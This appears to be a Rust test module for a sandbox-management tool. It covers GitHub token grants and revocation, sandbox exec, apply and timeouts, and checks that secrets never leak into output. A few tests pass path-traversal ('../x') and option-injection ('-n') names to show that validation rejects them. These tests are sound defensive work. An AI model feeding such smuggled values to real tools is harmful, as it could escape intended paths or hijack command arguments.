        let v = sandbox_options(&f.ctx()).unwrap();
        let img = &v["images"][0];
        assert_eq!(img["image"], "claude-code:latest");
        assert_eq!(img["default_for_kept"], true);
        assert_eq!(img["about"], "Claude Code and its tools.");
        let by = |id: &str| {
            v["providers_to_name"]
                .as_array()
                .unwrap()
                .iter()
                .find(|p| p["provider"] == id)
                .cloned()
                .unwrap()
        };
        assert_eq!(by("rust")["needs_credential"], false);
        assert_eq!(by("github")["needs_credential"], true);
        assert!(v["toolchains"]
            .as_array()
            .unwrap()
            .iter()
            .any(|g| g["toolchain"] == "rust" && g["open_by_default"] == true));
        assert!(v["providers_existing"].to_string().contains("npm"));
        assert!(!v.to_string().contains("GITHUB_TOKEN"), "{v}");
    }

    #[test]
    fn a_bare_token_name_is_replaced_by_one_for_the_repo() {
        let f = Fake::new("generic-name");
        let ctx = Ctx {
            repo_vars: Some(Vec::new()),
            ..f.ctx()
        };
        let e = repo_grant(&ctx, "w1", URL, "GITHUB_TOKEN").unwrap_err();
        assert!(e.contains("osh mcp secret set R_GITHUB_TOKEN"), "{e}");
        assert!(!e.contains("secret set GITHUB_TOKEN"), "{e}");
        assert!(e.contains("any name that suits the user works"), "{e}");
    }

    #[test]
    fn a_grant_without_a_token_tells_the_user_every_step() {
        let f = Fake::new("grant-guide");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        let ctx = Ctx {
            repo_vars: Some(Vec::new()),
            ..f.ctx()
        };
        let e = repo_grant(&ctx, "w1", URL, "OSH_TEST_GRANT_TOK").unwrap_err();
        // a) the page that creates a token for this repo
        assert!(
            e.contains("https://github.com/settings/personal-access-tokens/new?"),
            "{e}"
        );
        assert!(e.contains("o/r"), "{e}");
        // b) the command, run outside the chat
        assert!(e.contains("osh mcp secret set OSH_TEST_GRANT_TOK"), "{e}");
        assert!(e.contains("outside this chat"), "{e}");
        // c) no recreation
        assert!(e.contains("No sandbox restart or recreation"), "{e}");
        // d) how to remove it again
        assert!(
            e.contains("osh mcp secret remove OSH_TEST_GRANT_TOK"),
            "{e}"
        );
        assert!(e.contains("sandbox_repo_revoke"), "{e}");
        assert!(
            e.contains("does NOT revoke access") && e.contains("settings/personal-access-tokens"),
            "{e}"
        );
        let calls = f.calls();
        assert!(
            !calls.contains("provider create") && !calls.contains("attach"),
            "{calls}"
        );
        std::env::remove_var("OSH_FAKE_SANDBOXES");
    }

    #[test]
    fn a_grant_with_a_stored_token_attaches_to_the_running_sandbox_without_recreating_it() {
        let f = Fake::new("grant-ok");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        std::env::set_var("OSH_FAKE_FAIL", "provider get");
        let ctx = Ctx {
            repo_vars: Some(Vec::new()),
            ..f.ctx()
        };
        crate::secrets::set(&ctx.dir, "OSH_TEST_GRANT_OK", &secret_value()).unwrap();
        let out = repo_grant(&ctx, "w1", URL, "OSH_TEST_GRANT_OK");
        for k in ["OSH_FAKE_SANDBOXES", "OSH_FAKE_FAIL"] {
            std::env::remove_var(k);
        }
        let out = out.unwrap();
        assert_eq!(out["attached"], true, "{out}");
        assert!(
            out["to_remove"]
                .as_str()
                .unwrap()
                .contains("does NOT revoke access"),
            "{out}"
        );
        assert_eq!(out["repo"], "o/r");
        let calls = f.calls();
        assert!(
            calls.contains("provider create --name github-w1-r"),
            "{calls}"
        );
        assert!(
            calls.contains("sandbox provider attach w1 github-w1-r"),
            "{calls}"
        );
        assert!(
            !calls.contains("sandbox create") && !calls.contains("sandbox delete"),
            "{calls}"
        );
        assert!(!calls.contains("sandbox stop"), "{calls}");
        assert!(!calls.contains(&secret_value()) && !out.to_string().contains(&secret_value()));
    }

    #[test]
    fn a_grant_refuses_a_missing_sandbox_and_a_failed_attach_drops_the_provider() {
        let f = Fake::new("grant-fail");
        let ctx = Ctx {
            repo_vars: Some(Vec::new()),
            ..f.ctx()
        };
        crate::secrets::set(&ctx.dir, "OSH_TEST_GRANT_F", &secret_value()).unwrap();
        let e = repo_grant(&ctx, "w1", URL, "OSH_TEST_GRANT_F").unwrap_err();
        assert!(e.contains("no sandbox named w1"), "{e}");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        std::env::set_var("OSH_FAKE_FAIL", "provider get");
        let f2 = f.calls();
        std::env::set_var("OSH_FAKE_FAIL_ONCE", "sandbox provider attach");
        let e = repo_grant(&ctx, "w1", URL, "OSH_TEST_GRANT_F").unwrap_err();
        for k in ["OSH_FAKE_SANDBOXES", "OSH_FAKE_FAIL", "OSH_FAKE_FAIL_ONCE"] {
            std::env::remove_var(k);
        }
        assert!(e.contains("attaching"), "{e}");
        assert!(f.calls().len() > f2.len());
        assert!(
            f.calls().contains("provider delete github-w1-r"),
            "{}",
            f.calls()
        );
    }

    #[test]
    fn a_revoke_detaches_and_deletes_the_provider() {
        let f = Fake::new("revoke");
        std::env::set_var(
            "OSH_FAKE_PROVIDERS",
            r#"{"providers":[{"name":"github-w1-r","type":"x"}]}"#,
        );
        let out = repo_revoke(&f.ctx(), "w1", URL);
        std::env::remove_var("OSH_FAKE_PROVIDERS");
        let out = out.unwrap();
        assert_eq!(out["deleted"], true, "{out}");
        assert!(
            out["next"].as_str().unwrap().contains("still valid"),
            "{out}"
        );
        let calls = f.calls();
        assert!(calls.contains("provider delete github-w1-r"), "{calls}");
        assert!(repo_revoke(&f.ctx(), "../x", URL).is_err());
    }

    #[test]
    fn delete_and_exec_validate_the_name() {
        let f = Fake::new("badname");
        assert!(sandbox_delete(&f.ctx(), "../x").is_err());
        assert!(sandbox_exec(&f.ctx(), "-n", &["ls".into()]).is_err());
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn exec_nonzero_is_ok_with_exit_code() {
        let f = Fake::new("exec");
        std::env::set_var("OSH_FAKE_EXEC_EXIT", "3");
        std::env::set_var("OSH_FAKE_EXEC_STDOUT", "out");
        std::env::set_var("OSH_FAKE_EXEC_STDERR", "err");
        let argv = vec!["sh".to_string(), "-c".into(), "exit 3".into()];
        let v = sandbox_exec(&f.ctx(), "w1", &argv).unwrap();
        assert_eq!(v, json!({"exit_code":3,"stdout":"out","stderr":"err"}));
        let calls = f.calls();
        let line = calls.lines().next().unwrap();
        assert!(line.starts_with("sandbox exec -n w1 "), "{line}");
        assert!(line.ends_with("-- sh -c exit 3"), "{line}");
    }

    #[test]
    fn exec_needs_a_command() {
        let f = Fake::new("exec-empty");
        assert!(sandbox_exec(&f.ctx(), "w1", &[]).is_err());
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn apply_unchanged_when_exists() {
        let f = Fake::new("apply-same");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        let v = apply(&f.ctx(), &spec()).unwrap();
        assert_eq!(v, json!({"action":"unchanged","name":"w1"}));
        assert!(!f.calls().contains("create"), "{}", f.calls());
    }

    #[test]
    fn apply_creates_when_absent() {
        let f = Fake::new("apply-new");
        let v = apply(&f.ctx(), &spec()).unwrap();
        assert_eq!(v, json!({"action":"created","name":"w1"}));
        assert!(f.calls().lines().any(|l| l.starts_with("sandbox create")));
    }

    #[test]
    fn apply_validates_before_listing() {
        let f = Fake::new("apply-bad");
        assert!(apply(&f.ctx(), &json!({"name":"../x"})).is_err());
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn envelope_maps_err_to_ok_false_exit_1() {
        assert_eq!(envelope(Ok(json!({"a":1}))), (json!({"a":1}), 0));
        assert_eq!(
            envelope(Err("boom".into())),
            (json!({"ok":false,"error":"boom"}), 1)
        );
    }

    #[test]
    fn output_within_returns_a_quick_commands_output_even_when_it_is_large() {
        let mut c = Command::new("sh");
        c.args(["-c", "head -c 3000000 /dev/zero; echo done >&2; exit 3"]);
        let t = std::time::Instant::now();
        let out = output_within(c, std::time::Duration::from_secs(30)).unwrap();
        assert!(t.elapsed() < std::time::Duration::from_secs(10));
        assert_eq!((out.stdout.len(), out.status.code()), (3_000_000, Some(3)));
        assert_eq!(String::from_utf8_lossy(&out.stderr).trim(), "done");
    }

    #[test]
    fn output_within_gives_up_on_a_command_that_never_answers() {
        let mut c = Command::new("sleep");
        c.arg("30");
        let t = std::time::Instant::now();
        let e = output_within(c, std::time::Duration::from_millis(700)).unwrap_err();
        assert!(
            t.elapsed() < std::time::Duration::from_secs(5),
            "{:?}",
            t.elapsed()
        );
        assert!(e.contains("did not answer"), "{e}");
    }

    #[test]
    fn sandbox_exists_and_the_active_gateway_come_from_the_cli_lists() {
        let f = Fake::new("ops-exists");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        assert_eq!(sandbox_exists(&f.ctx(), "w1"), Ok(true));
        assert_eq!(sandbox_exists(&f.ctx(), "w2"), Ok(false));
        std::env::set_var("OSH_FAKE_FAIL", "sandbox list");
        assert!(
            sandbox_exists(&f.ctx(), "w1").is_err(),
            "a failed list is not 'gone'"
        );
        std::env::remove_var("OSH_FAKE_FAIL");
        assert_eq!(active_gateway(), Ok(None));
        std::env::set_var(
            "OSH_FAKE_GATEWAYS",
            r#"[{"name":"a","endpoint":"e","active":false},{"name":"b","endpoint":"e","active":true}]"#,
        );
        assert_eq!(active_gateway(), Ok(Some("b".to_string())));
    }
}
